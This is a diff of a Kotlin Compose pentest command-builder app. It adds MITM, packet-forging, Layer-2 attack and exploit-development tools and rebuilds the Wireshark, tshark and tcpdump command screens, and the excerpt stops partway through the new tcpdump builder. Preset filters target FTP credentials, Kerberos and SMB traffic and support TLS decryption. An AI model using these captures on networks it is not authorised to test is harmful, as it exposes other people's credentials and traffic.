@@ -269,8 +269,12 @@ val ALL_BUILDER_TOOLS = listOf(
     BuilderToolItem("name-that-hash", "name-that-hash", BuilderCategory.PASSWORDS, "Modern hash türü tespit aracı", "Modern hash identification engine"),
 
     // 5. PACKET & SNIFFING
-    BuilderToolItem("tcpdump", "tcpdump", BuilderCategory.SNIFFING, "Ağ trafiği yakalama ve paket filtresi", "Network packet analyzer & capture"),
-    BuilderToolItem("tshark", "tshark", BuilderCategory.SNIFFING, "Terminal tabanlı Wireshark ayrıştırıcı", "Terminal-based Wireshark dissector"),
+    BuilderToolItem("wireshark", "Wireshark", BuilderCategory.SNIFFING, "Ağ protokol analizörü ve canlı paket yakalama", "The world's most popular network protocol analyzer"),
+    BuilderToolItem("tshark", "tshark", BuilderCategory.SNIFFING, "Terminal tabanlı Wireshark ayrıştırıcı ve alan süzücü", "Terminal-based Wireshark dissector & packet filter"),
+    BuilderToolItem("tcpdump", "tcpdump", BuilderCategory.SNIFFING, "Komut satırı paket analizörü ve BPF filtreleme motoru", "Command-line packet analyzer & BPF filtering"),
+    BuilderToolItem("ettercap", "Ettercap", BuilderCategory.SNIFFING, "LAN ortadaki adam (MITM) ve ARP/DNS zehirleme kiti", "Comprehensive suite for MITM attacks on LAN"),
+    BuilderToolItem("scapy", "Scapy", BuilderCategory.SNIFFING, "Python paket manipülasyonu, sahtecilik ve gönderme motoru", "Interactive packet crafting, sniffing & forging engine"),
+    BuilderToolItem("yersinia", "Yersinia", BuilderCategory.SNIFFING, "Katman-2 (STP, CDP, DTP, DHCP, HSRP) saldırı çerçevesi", "Layer 2 attack framework for STP, CDP, DTP, DHCP"),
 
     // 6. PIVOTING & TUNNELING
     BuilderToolItem("chisel", "Chisel", BuilderCategory.TUNNELING, "HTTP üzerinden hızlı TCP/UDP tüneli", "Fast TCP/UDP tunnel over HTTP"),
@@ -291,8 +295,11 @@ val ALL_BUILDER_TOOLS = listOf(
     BuilderToolItem("trufflehog", "TruffleHog", BuilderCategory.OSINT, "Git depolarında gizli anahtar taraması", "Find leaked secrets and API keys"),
 
     // 9. REVERSE ENGINEERING & EXPLOIT
+    BuilderToolItem("checksec", "checksec", BuilderCategory.REVERSE, "İkili dosya güvenlik koruma denetimi (NX, PIE, Canary)", "Check binary mitigations (ASLR, NX, Canary, RELRO)"),
+    BuilderToolItem("ropper", "Ropper & ROPgadget", BuilderCategory.REVERSE, "ROP/JOP gadget arayıcı ve zincir üretici", "Advanced ROP/JOP gadget finder & chain generator"),
+    BuilderToolItem("pwntools", "pwntools (pwn CLI)", BuilderCategory.REVERSE, "Exploit geliştirme kiti (cyclic, asm, shellcraft)", "CTF and exploit development CLI suite"),
+    BuilderToolItem("x64dbg", "x64dbg / x32dbg", BuilderCategory.REVERSE, "Windows x64/x32 hata ayıklayıcı ve tersine mühendislik", "Open-source x64/x32 Windows debugger"),
     BuilderToolItem("searchsploit", "Searchsploit", BuilderCategory.REVERSE, "Çevrimdışı Exploit-DB arama aracı", "Offline Exploit-DB search utility"),
-    BuilderToolItem("checksec", "checksec", BuilderCategory.REVERSE, "İkili dosya güvenlik koruma denetimi", "Check binary mitigations (ASLR, NX)"),
     BuilderToolItem("radare2", "Radare2 (rabin2)", BuilderCategory.REVERSE, "İkili dosya sembol ve string analizi", "Binary info, symbols, and strings extraction"),
     BuilderToolItem("binwalk", "Binwalk", BuilderCategory.FORENSICS, "Firmware ve gömülü dosya analizörü", "Firmware analysis and extraction tool"),
     BuilderToolItem("exiftool", "ExifTool", BuilderCategory.FORENSICS, "Dosya üst veri (metadata) okuyucu", "Read and write meta information in files"),
@@ -706,8 +713,16 @@ fun CommandBuilderView(
             "gdb" -> GdbBuilder(language)
             "pwndbg-gef", "pwndbg", "gef" -> PwndbgGefBuilder(language)
             "aircrack-ng" -> AircrackNgBuilder(language)
-            "tcpdump" -> TcpdumpBuilder(language)
+            "wireshark" -> WiresharkBuilder(language)
             "tshark" -> TsharkBuilder(language)
+            "tcpdump" -> TcpdumpBuilder(language)
+            "ettercap" -> EttercapBuilder(language)
+            "scapy" -> ScapyBuilder(language)
+            "yersinia" -> YersiniaBuilder(language)
+            "checksec" -> ChecksecBuilder(language)
+            "ropper", "ropgadget" -> RopperBuilder(language)
+            "pwntools", "pwn" -> PwntoolsBuilder(language)
+            "x64dbg", "x32dbg", "x96dbg" -> X64dbgBuilder(language)
             "chisel" -> ChiselBuilder(language)
             "ligolo", "ligolo-ng" -> LigoloBuilder(language)
             "proxychains" -> ProxychainsBuilder(language)
@@ -719,7 +734,6 @@ fun CommandBuilderView(
             "sherlock" -> SherlockBuilder(language)
             "gitleaks" -> GitleaksBuilder(language)
             "trufflehog" -> TruffleHogBuilder(language)
-            "checksec" -> ChecksecBuilder(language)
             "rabin2" -> Rabin2Builder(language)
             "binwalk" -> BinwalkBuilder(language)
             "exiftool" -> ExifToolBuilder(language)
@@ -11542,31 +11556,58 @@ fun AircrackNgBuilder(language: AppLanguage) {
     }
 }
 
-// 38. TCPDUMP
+// -------------------------------------------------------------
+// 5. PACKET & SNIFFING COMPREHENSIVE BUILDERS
+// -------------------------------------------------------------
+
+// WIRESHARK
 @Composable
-fun TcpdumpBuilder(language: AppLanguage) {
+fun WiresharkBuilder(language: AppLanguage) {
+    var mode by remember { mutableStateOf("live") }
     var iface by remember { mutableStateOf("eth0") }
-    var bpfFilter by remember { mutableStateOf("tcp port 80") }
-    var noDns by remember { mutableStateOf(true) }
-    var verbose by remember { mutableStateOf(true) }
-    var hexAscii by remember { mutableStateOf(false) }
-    var snaplenZero by remember { mutableStateOf(true) }
-    var countLimit by remember { mutableStateOf("100") }
+    var pcapFile by remember { mutableStateOf("/tmp/traffic.pcapng") }
+    var bpfFilter by remember { mutableStateOf("tcp port 80 or 443") }
+    var displayFilter by remember { mutableStateOf("http or dns or tls") }
+    var immediateCapture by remember { mutableStateOf(true) }
+    var saveFile by remember { mutableStateOf("output_capture.pcapng") }
+    var enableSave by remember { mutableStateOf(false) }
+    var packetCount by remember { mutableStateOf("1000") }
     var enableCount by remember { mutableStateOf(false) }
-    var savePcap by remember { mutableStateOf(false) }
+    var ringFiles by remember { mutableStateOf("5") }
+    var enableRing by remember { mutableStateOf(false) }
+    var tlsKeylog by remember { mutableStateOf("") }
+    var luaScript by remember { mutableStateOf("") }
 
     Column {
-        OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Arayüz (-i: eth0, any, tun0, wlan0)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        Text(text = "YAKALAMA KAYNAĞI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            listOf("live" to "Canlı Ağ Arayüzü (-i)", "file" to "Kayıtlı PCAP Dosyası (-r)").forEach { (m, lbl) ->
+                val sel = mode == m
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
         Spacer(modifier = Modifier.height(8.dp))
-        Text(text = "BPF FİLTRE ŞABLONLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        if (mode == "live") {
+            OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Ağ Arayüzü (-i: eth0, wlan0, any, tun0)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        } else {
+            OutlinedTextField(value = pcapFile, onValueChange = { pcapFile = it }, label = { Text("Açılacak PCAP Dosyası (-r)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "BPF YAKALAMA FİLTRESİ HAZIR ŞABLONLARI (-f)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
         Spacer(modifier = Modifier.height(4.dp))
         Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
             listOf(
-                "tcp port 80" to "HTTP",
-                "port 53" to "DNS",
-                "icmp" to "ICMP",
-                "tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0" to "SYN Only",
-                "net 10.10.10.0/24" to "Subnet"
+                "tcp port 80 or 443" to "Web (80/443)",
+                "port 53" to "DNS (53)",
+                "icmp" to "ICMP / Ping",
+                "not broadcast and not multicast" to "No Broadcast",
+                "host 192.168.1.50" to "Target IP",
+                "port 88 or 389" to "AD / Kerberos"
             ).forEach { (f, lbl) ->
                 val sel = bpfFilter == f
                 Box(
@@ -11574,42 +11615,100 @@ fun TcpdumpBuilder(language: AppLanguage) {
                 ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
             }
         }
-        Spacer(modifier = Modifier.height(8.dp))
-        OutlinedTextField(value = bpfFilter, onValueChange = { bpfFilter = it }, label = { Text("Özel BPF Filtresi") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
         Spacer(modifier = Modifier.height(6.dp))
-        ToggleOption(label = "-nn IP ve Port İsimlerini Sayısal Göster (No DNS)", checked = noDns, onCheckedChange = { noDns = it })
-        ToggleOption(label = "-v Ayrıntılı Paket Başlıkları", checked = verbose, onCheckedChange = { verbose = it })
-        ToggleOption(label = "-X Paket İçeriğini Hex ve ASCII Göster", checked = hexAscii, onCheckedChange = { hexAscii = it })
-        ToggleOption(label = "-s 0 Paketleri Kesmeden Tam Yakala", checked = snaplenZero, onCheckedChange = { snaplenZero = it })
-        ToggleOption(label = "-c $countLimit Paket Yakala ve Dur", checked = enableCount, onCheckedChange = { enableCount = it })
-        ToggleOption(label = "-w capture.pcap Dosyaya Kaydet", checked = savePcap, onCheckedChange = { savePcap = it })
+        OutlinedTextField(value = bpfFilter, onValueChange = { bpfFilter = it }, label = { Text("Özel BPF Yakalama Filtresi (-f)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
 
-        val parts = mutableListOf("sudo tcpdump", "-i", iface)
-        if (noDns) parts.add("-nn")
-        if (verbose) parts.add("-v")
-        if (hexAscii) parts.add("-X")
-        if (snaplenZero) parts.addAll(listOf("-s", "0"))
-        if (enableCount) parts.addAll(listOf("-c", countLimit))
-        if (savePcap) parts.addAll(listOf("-w", "capture.pcap"))
-        if (bpfFilter.isNotBlank()) parts.add("'$bpfFilter'")
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "EKRAN GÖRÜNTÜLEME FİLTRESİ ŞABLONLARI (-Y)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf(
+                "http.request or dns or tls" to "Standard Web",
+                "http.request.method == \"POST\"" to "HTTP POST",
+                "dns.flags.response == 1" to "DNS Reply",
+                "tls.handshake.type == 1" to "TLS Client Hello",
+                "smb2 or kerberos" to "AD SMB/Krb",
+                "tcp.analysis.flags" to "TCP Re-trans"
+            ).forEach { (f, lbl) ->
+                val sel = displayFilter == f
+                Box(
+                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { displayFilter = f }.padding(horizontal = 8.dp, vertical = 5.dp)
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = displayFilter, onValueChange = { displayFilter = it }, label = { Text("Wireshark Ekran Filtresi (-Y)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "GELİŞMİŞ ŞİFRE ÇÖZME & SEÇENEKLER", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = tlsKeylog, onValueChange = { tlsKeylog = it }, label = { Text("TLS Anahtar Günlüğü Dosyası (-o tls.keylog_file:...)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = luaScript, onValueChange = { luaScript = it }, label = { Text("Özel Lua Eklentisi (-X lua_script:...)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+        Spacer(modifier = Modifier.height(6.dp))
+        if (mode == "live") {
+            ToggleOption(label = "-k Başlar Başlamaz Canlı Yakalamayı Başlat", checked = immediateCapture, onCheckedChange = { immediateCapture = it })
+            ToggleOption(label = "-w $saveFile Dosyaya Kaydet", checked = enableSave, onCheckedChange = { enableSave = it })
+            if (enableSave) {
+                Spacer(modifier = Modifier.height(4.dp))
+                OutlinedTextField(value = saveFile, onValueChange = { saveFile = it }, label = { Text("Kayıt Dosyası Adı") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            ToggleOption(label = "-c $packetCount Paket Sonra Durdur", checked = enableCount, onCheckedChange = { enableCount = it })
+            if (enableCount) {
+                Spacer(modifier = Modifier.height(4.dp))
+                OutlinedTextField(value = packetCount, onValueChange = { packetCount = it }, label = { Text("Paket Sınırı") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            ToggleOption(label = "-b files:$ringFiles Halka Tampon (Ring Buffer)", checked = enableRing, onCheckedChange = { enableRing = it })
+        }
+
+        val parts = mutableListOf("wireshark")
+        if (mode == "live") {
+            parts.addAll(listOf("-i", iface))
+            if (immediateCapture) parts.add("-k")
+            if (bpfFilter.isNotBlank()) parts.addAll(listOf("-f", "\"$bpfFilter\""))
+            if (enableSave && saveFile.isNotBlank()) parts.addAll(listOf("-w", saveFile))
+            if (enableCount && packetCount.isNotBlank()) parts.addAll(listOf("-c", packetCount))
+            if (enableRing && ringFiles.isNotBlank()) parts.addAll(listOf("-b", "files:$ringFiles"))
+        } else {
+            parts.addAll(listOf("-r", pcapFile))
+        }
+        if (displayFilter.isNotBlank()) parts.addAll(listOf("-Y", "\"$displayFilter\""))
+        if (tlsKeylog.isNotBlank()) parts.addAll(listOf("-o", "tls.keylog_file:$tlsKeylog"))
+        if (luaScript.isNotBlank()) parts.addAll(listOf("-X", "lua_script:$luaScript"))
 
         GeneratedCommandCard(command = parts.joinToString(" "), language = language)
     }
 }
 
-// 39. TSHARK
+// TSHARK
 @Composable
 fun TsharkBuilder(language: AppLanguage) {
     var mode by remember { mutableStateOf("live") }
     var iface by remember { mutableStateOf("eth0") }
-    var pcapFile by remember { mutableStateOf("capture.pcap") }
+    var pcapFile by remember { mutableStateOf("capture.pcapng") }
     var displayFilter by remember { mutableStateOf("http.request.method == \"POST\"") }
-    var extractFields by remember { mutableStateOf(false) }
-    var fields by remember { mutableStateOf("ip.src ip.dst http.host http.user_agent") }
+    var bpfFilter by remember { mutableStateOf("") }
+    var outputFormat by remember { mutableStateOf("fields") }
+    val availableFields = listOf(
+        "ip.src", "ip.dst", "tcp.dstport", "http.host",
+        "http.request.uri", "dns.qry.name", "tls.handshake.extensions_server_name",
+        "kerberos.CNameString", "smb2.filename"
+    )
+    var selectedFields by remember { mutableStateOf(setOf("ip.src", "ip.dst", "http.host", "http.request.uri")) }
+    var customField by remember { mutableStateOf("") }
+    var statsType by remember { mutableStateOf("none") }
+    var packetCount by remember { mutableStateOf("100") }
+    var enableCount by remember { mutableStateOf(false) }
+    var savePcap by remember { mutableStateOf("") }
+    var noDns by remember { mutableStateOf(true) }
+    var tlsKeylog by remember { mutableStateOf("") }
 
     Column {
-        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-            listOf("live" to "Canlı Yakalama (-i)", "file" to "Dosyadan Oku (-r)").forEach { (m, lbl) ->
+        Text(text = "İŞLEM MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("live" to "Canlı (-i)", "file" to "Dosyadan Oku (-r)", "stats" to "İstatistik (-z)").forEach { (m, lbl) ->
                 val sel = mode == m
                 Box(
                     modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
@@ -11623,24 +11722,594 @@ fun TsharkBuilder(language: AppLanguage) {
         } else {
             OutlinedTextField(value = pcapFile, onValueChange = { pcapFile = it }, label = { Text("PCAP Dosya Yolu (-r)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
         }
-        Spacer(modifier = Modifier.height(8.dp))
-        OutlinedTextField(value = displayFilter, onValueChange = { displayFilter = it }, label = { Text("Wireshark Ekran Filtresi (-Y)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
-        Spacer(modifier = Modifier.height(6.dp))
-        ToggleOption(label = "-T fields Belirli Alanları Ayrıştır (-e)", checked = extractFields, onCheckedChange = { extractFields = it })
-        if (extractFields) {
-            Spacer(modifier = Modifier.height(6.dp))
-            OutlinedTextField(value = fields, onValueChange = { fields = it }, label = { Text("Alanlar (örn: ip.src ip.dst http.host)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
-        }
 
-        val parts = mutableListOf("tshark")
-        if (mode == "live") parts.addAll(listOf("-i", iface, "-n")) else parts.addAll(listOf("-r", pcapFile))
-        if (displayFilter.isNotBlank()) parts.addAll(listOf("-Y", "'$displayFilter'"))
-        if (extractFields) {
-            parts.addAll(listOf("-T", "fields"))
-            fields.split(" ").filter { it.isNotBlank() }.forEach { f ->
-                parts.addAll(listOf("-e", f))
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "EKRAN FİLTRESİ (-Y) ŞABLONLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf(
+                "http.request.method == \"POST\"" to "HTTP POST",
+                "dns.flags.response == 1" to "DNS Yanıtları",
+                "tls.handshake.extension.type == 0" to "TLS SNI",
+                "kerberos.msg_type == 10" to "Krb AS-REQ",
+                "smb2.cmd == 1" to "SMB2 Negotiate",
+                "ftp.request.command in {\"USER\",\"PASS\"}" to "FTP Creds",
+                "tcp.flags.syn == 1 && tcp.flags.ack == 0" to "TCP SYN"
+            ).forEach { (f, lbl) ->
+                val sel = displayFilter == f
+                Box(
+                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { displayFilter = f }.padding(horizontal = 8.dp, vertical = 5.dp)
+                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
             }
         }
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = displayFilter, onValueChange = { displayFilter = it }, label = { Text("Wireshark Ekran Filtresi (-Y)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "ÇIKTI FORMATI (-T)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("fields" to "Alanlar (-T fields)", "text" to "Metin", "json" to "JSON", "ek" to "Elasticsearch").forEach { (f, lbl) ->
+                val sel = outputFormat == f
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { outputFormat = f }.padding(vertical = 5.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        if (outputFormat == "fields") {
+            Spacer(modifier = Modifier.height(8.dp))
+            Text(text = "AYRIŞTIRILACAK ALANLAR (-e)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            LazyVerticalGrid(columns = GridCells.Fixed(3), modifier = Modifier.height(110.dp), horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
+                items(availableFields) { fld ->
+                    val checked = selectedFields.contains(fld)
+                    ToggleChip(label = fld, checked = checked, onClick = {
+                        selectedFields = if (checked) selectedFields - fld else selectedFields + fld
+                    })
+                }
+            }
+            Spacer(modifier = Modifier.height(4.dp))
+            OutlinedTextField(value = customField, onValueChange = { customField = it }, label = { Text("İlave Özel Alan (-e: örn. tcp.stream)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+
+        if (mode == "stats") {
+            Spacer(modifier = Modifier.height(10.dp))
+            Text(text = "İSTATİSTİK MODÜLÜ (-z)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf(
+                    "io,phs" to "Protokol Hiyerarşisi",
+                    "conv,ip" to "IP Sohbetleri",
+                    "conv,tcp" to "TCP Sohbetleri",
+                    "endpoints,ip" to "IP Uç Noktaları",
+                    "follow,tcp,ascii,0" to "TCP Akışını Takip Et"
+                ).forEach { (st, lbl) ->
+                    val sel = statsType == st
+                    Box(
+                        modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { statsType = st }.padding(horizontal = 8.dp, vertical = 5.dp)
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        Text(text = "SEÇENEKLER & SINIRLAMALAR", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(6.dp))
+        ToggleOption(label = "-n DNS İsim Çözümlemeyi Kapat (Hızlı)", checked = noDns, onCheckedChange = { noDns = it })
+        ToggleOption(label = "-c $packetCount Paket Sonra Dur", checked = enableCount, onCheckedChange = { enableCount = it })
+        if (enableCount) {
+            Spacer(modifier = Modifier.height(4.dp))
+            OutlinedTextField(value = packetCount, onValueChange = { packetCount = it }, label = { Text("Paket Sayısı") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        }
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = savePcap, onValueChange = { savePcap = it }, label = { Text("Filtrelenenleri PCAP Olarak Kaydet (-w dosya.pcap)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+        Spacer(modifier = Modifier.height(6.dp))
+        OutlinedTextField(value = tlsKeylog, onValueChange = { tlsKeylog = it }, label = { Text("TLS Keylog Dosyası (-o tls.keylog_file:...)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+
+        val parts = mutableListOf("tshark")
+        if (mode == "live") {
+            parts.addAll(listOf("-i", iface))
+        } else {
+            parts.addAll(listOf("-r", pcapFile))
+        }
+        if (noDns) parts.add("-n")
+        if (displayFilter.isNotBlank()) parts.addAll(listOf("-Y", "\"$displayFilter\""))
+        if (bpfFilter.isNotBlank()) parts.addAll(listOf("-f", "\"$bpfFilter\""))
+
+        if (mode == "stats" && statsType != "none") {
+            parts.addAll(listOf("-z", statsType, "-q"))
+        } else {
+            if (outputFormat == "fields") {
+                parts.addAll(listOf("-T", "fields"))
+                selectedFields.forEach { f -> parts.addAll(listOf("-e", f)) }
+                if (customField.isNotBlank()) parts.addAll(listOf("-e", customField.trim()))
+                parts.addAll(listOf("-E", "header=y", "-E", "separator=,", "-E", "quote=d"))
+            } else if (outputFormat != "text") {
+                parts.addAll(listOf("-T", outputFormat))
+            }
+        }
+
+        if (enableCount && packetCount.isNotBlank()) parts.addAll(listOf("-c", packetCount))
+        if (savePcap.isNotBlank()) parts.addAll(listOf("-w", savePcap.trim()))
+        if (tlsKeylog.isNotBlank()) parts.addAll(listOf("-o", "tls.keylog_file:${tlsKeylog.trim()}"))
+
+        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+    }
+}
+
+// TCPDUMP
+@Composable
+fun TcpdumpBuilder(language: AppLanguage) {
+    var source by remember { mutableStateOf("live") }
+    var iface by remember { mutableStateOf("eth0") }
+    var pcapFile by remember { mutableStateOf("/tmp/capture.pcap") }
+    var bpfFilter by remember { mutableStateOf("tcp port 80 or 443") }
+    var noDns by remember { mutableStateOf(true) }
+    var snaplenZero by remember { mutableStateOf(true) }
+    var verbosity by remember { mutableStateOf("-v") }
+    var payloadFormat by remember { mutableStateOf("-X") }
+    var timestamp by remember { mutableStateOf("-tttt") }
+    var countLimit by remember { mutableStateOf("100") }
+    var enableCount by remember { mutableStateOf(false) }
+    var saveFile by remember { mutableStateOf("traffic.pcap") }
+    var enableSave by remember { mutableStateOf(false) }
+    var ringRotate by remember { mutableStateOf(false) }
+    var ringSizeMb by remember { mutableStateOf("50") }
+    var ringCount by remember { mutableStateOf("5") }
+    var lineBuffered by remember { mutableStateOf(true) }
+    var quiet by remember { mutableStateOf(false) }
+
+    Column {
+        Text(text = "YAKALAMA KAYNAĞI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
